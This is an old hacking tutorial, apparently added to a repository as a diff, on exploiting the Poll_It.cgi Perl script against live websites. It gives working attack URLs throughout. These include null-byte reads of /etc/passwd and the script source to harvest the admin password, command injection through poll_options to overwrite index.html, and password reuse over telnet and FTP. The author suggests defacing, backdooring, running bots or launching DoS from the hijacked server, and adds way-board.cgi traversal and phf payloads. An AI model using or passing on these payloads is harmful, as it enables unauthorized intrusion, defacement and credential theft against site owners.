@@ -1,0 +1,79 @@
+How to "Hack" using Poll_It.cgi
+-------------------------------
+
+There are 2 main things you can do with the Poll_It.cgi vunerability
+1. Deface a site
+2. Owning a server
+
+We'll start with the basics:
+OK first of all we need some sites that have Poll_It.cgi Perl Script running
+So open your browser to www.av.com (or another search engine)
+In the search box type: url: /Poll_It.cgi
+
+Then just scroll down, untill you find something like:
+Poll It v2.0! by CGI World
+Poll It v2.0 by CGI World - A Product of I2 Services, Inc. Poll Title: Do you catch and release when fishing? Sometimes. no, never. yes, always. Poll...
+http://www.thedomainhere.com/cgi-bin/Poll_It.cgi 
+   •  More Pages From This Site
+
+The bit we're interested about is: http://www.thedomainhere.com/cgi-bin/
+So copy that down.
+
+To check that you have access type: http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=poll_info.txt%00
+and if there are no errors, your in!
+
+OK so now for the first section:
+1. Defacing a site
+Firstly we need 2 check you have write access by doing the following:
+Open http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&admin_password=&action=add_option&add_option=none&poll_options=id+>/tmp/.test%7C
+then read the contents by doing: http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=/tmp/.test%00
+If your uid=??(nobody) then you *DON'T* have write access :(
+So go onto the next section...
+
+If you do, then you can try the following:
+The main file is usually index.html or index.htm and its in the root dir, so if we use:
+http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&admin_password=&action=add_option&add_option=none&poll_options=echo+Your Text Here!+>../index.html|
+With any luck you will have changed the index.html to whatever you want.
+It works with any file, usually, and you can make it display what ever text you want!
+
+2. Owning a server
+OK, so you wanna try owning a server using this, huh?
+Well ok... although its not always successful, IT DOES WORK SOMETIMES!
+OK, so firstly we want the passwd file, to see the server's users, so type:
+http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=/etc/passwd%00
+This will give you a long list, try searching for thedomainhere and
+then look at the start of that line, that will be the username.
+The password is even simpler, just type:
+http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=Poll_It.cgi%00
+This will show you the cgi's code, now what you are looking for is:
+$admin_password = "passwordgoeshere";
+Now if the admin is stupid enough, he will use the same password on his shell also
+
+So now, its just a matter of telneting into www.thedomainhere.com
+(Open run, and type: telnet www.thedomainhere.com)
+Then type in the username you got from the passwd list
+and for the password use the password from the Poll_It.cgi
+eg: Telnet: www.thedomainhere.com Username: thedomainhere Password:passwordgoeshere
+You can also use an FTP client using the same username and password, most of the time.
+
+From there, what you do with the domain is upto you!
+
+Some suggestions:
+Deface the site
+Run Eggdrops
+Run BNCs
+Store files
+DoS people
+Backdoor it
+
+But remember, the more extream things you do, the more likly you are to get caught!
+
+There are many more CGI Vunerabilities, that use similar techniques, such as:
+way-board.cgi?db=../../../../../../../etc/passwd%00
+phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+But i'll leave those till another time!
+
+Well have fun!
+
+-HM2K
